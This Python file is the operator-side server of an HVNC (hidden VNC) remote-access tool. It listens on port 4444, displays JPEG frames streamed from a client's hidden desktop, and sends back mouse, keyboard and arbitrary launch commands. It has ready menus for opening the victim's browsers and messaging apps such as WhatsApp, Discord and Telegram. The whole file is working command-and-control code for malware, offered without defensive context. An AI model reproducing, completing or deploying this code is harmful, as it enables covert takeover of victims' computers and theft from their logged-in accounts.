import json
import socket
import struct
import threading
import io
import queue

import tkinter as tk
from PIL import Image, ImageTk

HOST    = "0.0.0.0"
PORT    = 4444

KEYEVENTF_KEYUP = 0x0002

# Protocolo (Server → Cliente):
#   0x01 + x(4) + y(4)         = 9  bytes  mouse move
#   0x02 + x(4) + y(4) + b(1)  = 10 bytes  mouse click
#   0x03 + vk(2) + flags(1)    = 4  bytes  key event
#   0x04 + x(4) + y(4) + b(1)  = 10 bytes  double click
#   0x05 + len(2) + utf8 cmd   = variable  launch app
#
# Protocolo (Cliente → Server):
#   size(4) + JPEG data         frame stream
#   Handshake: uint32 w + uint32 h + uint16 json_len + JSON

_BTN_STYLE = dict(bg='#3a3a3a', fg='#e0e0e0', activebackground='#555',
                  activeforeground='white', relief='flat',
                  font=('Consolas', 9), padx=8, pady=2, cursor='hand2')

_MENU_STYLE = dict(bg='#2d2d2d', fg='#e0e0e0',
                   activebackground='#0078d4', activeforeground='white',
                   font=('Consolas', 9), relief='flat', bd=0)

_CATEGORIES = [
    ('Browsers',  {'chrome', 'brave', 'firefox', 'edge', 'operagx', 'opera'}),
    ('Messaging', {'whatsapp', 'discord', 'telegram'}),
    ('System',    {'explorer'}),
]


class HVNCServer:
    def __init__(self):
        self.conn     = None
        self.running  = False
        self.cli_w    = 1920
        self.cli_h    = 1080
        self.disp_w   = 1280
        self.disp_h   = 720
        self.frame_q  = queue.Queue(maxsize=4)

        self.root = tk.Tk()
        self.root.title("HVNC Server")
        self.root.resizable(False, False)

        
        tb = tk.Frame(self.root, bg='#252525', pady=4)
        tb.pack(fill=tk.X)

        self._mb = tk.Menubutton(tb, text='⚡ Apps ▾',
                                 bg='#3a3a3a', fg='#e0e0e0',
                                 activebackground='#555', activeforeground='white',
                                 relief='flat', font=('Consolas', 9),
                                 padx=10, pady=2, cursor='hand2')
        self._mb.pack(side=tk.LEFT, padx=4)

        self._app_menu = tk.Menu(self._mb, tearoff=0, **_MENU_STYLE)
        self._mb['menu'] = self._app_menu

        tk.Frame(tb, bg='#252525', width=8).pack(side=tk.LEFT)
        tk.Label(tb, text='Run:', bg='#252525', fg='#888',
                 font=('Consolas', 9)).pack(side=tk.LEFT)

        self.run_var = tk.StringVar()
        run_entry = tk.Entry(tb, textvariable=self.run_var,
                             bg='#1a1a1a', fg='#e0e0e0',
                             insertbackground='white',
                             font=('Consolas', 9), relief='flat',
                             width=32)
        run_entry.pack(side=tk.LEFT, padx=4, ipady=2)
        run_entry.bind('<Return>', lambda _: self._on_run())

        tk.Button(tb, text='▶', command=self._on_run,
                  **_BTN_STYLE).pack(side=tk.LEFT)

       
        self.status_var = tk.StringVar(value="Waiting for client...")
        tk.Label(self.root, textvariable=self.status_var,
                 anchor='w', bg='#1e1e1e', fg='#00ff00',
                 font=('Consolas', 9)).pack(fill=tk.X)

        self.canvas = tk.Canvas(
            self.root, width=self.disp_w, height=self.disp_h,
            bg='black', cursor='crosshair', highlightthickness=0
        )
        self.canvas.pack()

        self._photo = None

        self.canvas.bind("<Motion>",          self._on_move)
        self.canvas.bind("<Button-1>",        lambda e: self._on_click(e, 0))
        self.canvas.bind("<Button-3>",        lambda e: self._on_click(e, 1))
        self.canvas.bind("<Double-Button-1>", lambda e: self._on_dblclick(e, 0))
        self.canvas.bind("<Double-Button-3>", lambda e: self._on_dblclick(e, 1))
        self.root.bind("<KeyPress>",   self._on_keydown)
        self.root.bind("<KeyRelease>", self._on_keyup)
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    

    def _recv_exact(self, n):
        buf = b''
        while len(buf) < n:
            chunk = self.conn.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("client disconnected")
            buf += chunk
        return buf

    def _recv_frame(self):
        size = struct.unpack('>I', self._recv_exact(4))[0]
        return self._recv_exact(size)

    def _send_cmd(self, data):
        if self.conn and self.running:
            try:
                self.conn.sendall(data)
            except Exception:
                pass

   

    def _rebuild_app_menu(self, apps):
        self._app_menu.delete(0, tk.END)
   
        app_map = {aid: lbl for lbl, aid in apps}

        for cat_label, cat_ids in _CATEGORIES:
            items = [(app_map[a_id], a_id) for a_id in
                     (a[1] for a in apps) if a_id in cat_ids and a_id in app_map]
            if not items:
                continue
            sub = tk.Menu(self._app_menu, tearoff=0, **_MENU_STYLE)
            for lbl, a_id in items:
                sub.add_command(label=f'  {lbl}',
                                command=lambda a=a_id: self._send_launch(a))
            self._app_menu.add_cascade(label=f'  {cat_label} ▸', menu=sub)

   

    def _frame_loop(self):
        while self.running:
            try:
                data = self._recv_frame()
                try:
                    self.frame_q.put_nowait(data)
                except queue.Full:
                    pass
            except Exception as e:
                print(f"[frame_loop] {e}")
                self.running = False
                break

    

    def _poll_frames(self):
        try:
            data = self.frame_q.get_nowait()
            img  = Image.open(io.BytesIO(data))
            self._photo = ImageTk.PhotoImage(img)
            self.canvas.create_image(0, 0, anchor=tk.NW, image=self._photo)
        except queue.Empty:
            pass
        self.root.after(8, self._poll_frames)

    

    def _scale(self, cx, cy):
        x = int(cx * self.cli_w / self.disp_w)
        y = int(cy * self.cli_h / self.disp_h)
        return x, y

    def _send_launch(self, cmd_str):
        data = cmd_str.encode('utf-8')
        self._send_cmd(struct.pack('>BH', 0x05, len(data)) + data)

    def _on_run(self):
        cmd = self.run_var.get().strip()
        if cmd:
            self._send_launch(cmd)
            self.run_var.set('')

    def _on_move(self, event):
        if not self.running:
            return
        x, y = self._scale(event.x, event.y)
        self._send_cmd(struct.pack('>Bii', 0x01, x, y))

    def _on_click(self, event, btn):
        if not self.running:
            return
        x, y = self._scale(event.x, event.y)
        self._send_cmd(struct.pack('>BiiB', 0x02, x, y, btn))

    def _on_dblclick(self, event, btn):
        if not self.running:
            return
        x, y = self._scale(event.x, event.y)
        self._send_cmd(struct.pack('>BiiB', 0x04, x, y, btn))

    def _on_keydown(self, event):
        if not self.running:
            return
        self._send_cmd(struct.pack('>BHB', 0x03, event.keycode, 0))

    def _on_keyup(self, event):
        if not self.running:
            return
        self._send_cmd(struct.pack('>BHB', 0x03, event.keycode, KEYEVENTF_KEYUP))

    

    def _on_close(self):
        self.running = False
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass
        self.root.destroy()

    def _accept_client(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(1)
        print(f"[*] Listening {HOST}:{PORT}")

        self.conn, addr = srv.accept()
        print(f"[+] Connected: {addr}")

    
        self.cli_w, self.cli_h = struct.unpack('>II', self._recv_exact(8))
        print(f"[*] Client res: {self.cli_w}x{self.cli_h}")

     
        json_len = struct.unpack('>H', self._recv_exact(2))[0]
        apps = json.loads(self._recv_exact(json_len).decode('utf-8'))
        print(f"[*] Apps: {[a[0] for a in apps]}")

        self.status_var.set(f"Client: {addr[0]}  |  {self.cli_w}x{self.cli_h}")
        self.running = True

        self.root.after(0, lambda: self._rebuild_app_menu(apps))
        threading.Thread(target=self._frame_loop, daemon=True).start()

    def run(self):
        threading.Thread(target=self._accept_client, daemon=True).start()
        self.root.after(8, self._poll_frames)
        self.root.mainloop()


if __name__ == "__main__":
    HVNCServer().run()
